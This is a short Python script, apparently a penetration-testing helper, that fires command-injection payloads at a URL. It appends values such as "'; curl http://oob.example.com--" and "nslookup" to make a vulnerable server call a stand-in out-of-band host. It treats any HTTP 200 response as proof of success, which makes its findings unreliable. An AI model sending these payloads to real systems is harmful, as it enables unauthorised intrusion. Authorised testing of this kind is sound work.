# oob_tester.py

import requests
import logging
import random

def dns_oob_injection(url, headers, is_post=False, data=None):
    payloads = [
        "1; nslookup oob.example.com--",
        "'; nslookup oob.example.com--",
        "\"; nslookup oob.example.com--"
    ]
    for payload in payloads:
        if is_post:
            data['injection'] = payload
            response = requests.post(url, headers=headers, data=data)
        else:
            response = requests.get(f"{url}{payload}", headers=headers)
        if response.status_code == 200:
            logging.info(f"Out-of-band DNS enjeksiyonu başarılı! Payload: {payload}")
            return True
    return False

def http_oob_injection(url, headers, is_post=False, data=None):
    payloads = [
        "1; curl http://oob.example.com--",
        "'; curl http://oob.example.com--",
        "\"; curl http://oob.example.com--"
    ]
    for payload in payloads:
        if is_post:
            data['injection'] = payload
            response = requests.post(url, headers=headers, data=data)
        else:
            response = requests.get(f"{url}{payload}", headers=headers)
        if response.status_code == 200:
            logging.info(f"Out-of-band HTTP enjeksiyonu başarılı! Payload: {payload}")
            return True
    return False